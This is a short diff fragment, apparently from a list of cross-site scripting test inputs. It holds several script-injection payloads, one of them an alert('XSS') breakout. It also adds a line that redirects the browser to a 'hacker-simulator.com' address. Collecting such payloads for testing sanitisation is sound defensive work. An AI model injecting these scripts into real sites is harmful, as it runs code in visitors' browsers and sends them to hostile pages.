@@ -14,3 +14,4 @@
 </script><script>alert('XSS');</script>
 <body style="background-color:red;">
 <script> alert();window.location.href = 'https://www.example.com/new-page';</script>
+<script> alert();window.location.href = 'https://hacker-simulator.com///new-page';</script>
